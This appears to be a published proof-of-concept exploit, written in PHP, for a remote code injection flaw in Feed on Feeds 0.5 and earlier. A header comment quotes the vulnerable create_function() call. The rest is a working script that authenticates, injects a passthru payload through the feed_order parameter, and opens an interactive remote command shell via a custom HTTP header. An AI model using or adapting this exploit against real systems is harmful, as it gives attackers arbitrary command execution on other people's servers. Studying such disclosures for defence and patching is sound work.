<?php

/*
    ------------------------------------------------------
    Feed on Feeds <= 0.5 Remote PHP Code Injection Exploit
    ------------------------------------------------------
    
    author..........: EgiX
    mail............: n0b0d13s[at]gmail[dot]com
    software link...: http://feedonfeeds.com/ or http://code.google.com/p/feed-on-feeds/

    This PoC was written for educational purpose. Use it at your own risk.
    Author will be not responsible for any damage.
    
    [-] vulnerable code in /fof-main.php

    1091.    function fof_multi_sort($tab,$key,$rev)
    1092.    {
    1093.        if($rev)
    1094.        {
    1095.            $compare = create_function('$a,$b','if (strtolower($a["'.$key.'"]) == strtolower($b["'.$key.'"])) {return 0;}else {return (strtolower($a["'.$key.'"]) > strtolower($b["'.$key.'"])) ? -1 : 1;}');
    1096.        }
    1097.        else
    1098.        {
    1099.            $compare = create_function('$a,$b','if (strtolower($a["'.$key.'"]) == strtolower($b["'.$key.'"])) {return 0;}else {return (strtolower($a["'.$key.'"]) < strtolower($b["'.$key.'"])) ? -1 : 1;}');
    1100.        }
    1101.        
    1102.        usort($tab,$compare) ;
    1103.        return $tab ;
    1104.    }
    
    The $key parameter passed to fof_multi_sort() function isn't properly sanitized before being used in a call 
    to "create_function()" at line 1095 or 1099. This can be exploited to inject and execute arbitrary PHP code.
	Successful exploitation of this vulnerability requires authentication.
    
*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

function http_send($host, $packet)
{
    if (!($sock = fsockopen($host, 80)))
        die( "\n[-] No response from {$host}:80\n");
    
    fwrite($sock, $packet);
    return stream_get_contents($sock);
}

function inject_php()
{
    global $host, $path, $user, $pass;
    
    $data    = "feed_order=\"]));}print('<<');passthru(base64_decode(\$_SERVER[HTTP_CMD]));print('>>');%23";
    $packet  = "POST {$path}set-prefs.php HTTP/1.0\r\n";
    $packet .= "Host: {$host}\r\n";
    $packet .= "Cookie: user_name={$user}; user_password_hash={$pass}\r\n";
    $packet .= "Content-Length: ".strlen($data)."\r\n";
    $packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
    $packet .= "Connection: close\r\n\r\n";
    $packet .= $data;
    
    if (preg_match("/login.php/", http_send($host, $packet))) die("\n[-] Incorrect username or password!\n");
}

print "\n+----------------------------------------------------------------+";
print "\n| Feed on Feeds <= 0.5 Remote PHP Code Injection Exploit by EgiX |";
print "\n+----------------------------------------------------------------+\n";

if ($argc < 5)
{
    print "\nUsage......: php $argv[0] <host> <path> <username> <password>\n";
    print "\nExample....: php $argv[0] localhost / user pass";
    print "\nExample....: php $argv[0] localhost /fof/ user pass\n";
    die();
}

$host = $argv[1];
$path = $argv[2];
$user = $argv[3];
$pass = md5($argv[4].$user);

inject_php();

$packet  = "GET {$path}sidebar.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cookie: user_name={$user}; user_password_hash={$pass}\r\n";
$packet .= "Cmd: %s\r\n";
$packet .= "Connection: close\r\n\r\n";

while(1)
{
    print "\nfof-shell# ";
    if (($cmd = trim(fgets(STDIN))) == "exit") break;
    preg_match("/<<(.*)>>/s", http_send($host, sprintf($packet, base64_encode($cmd))), $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
}

?>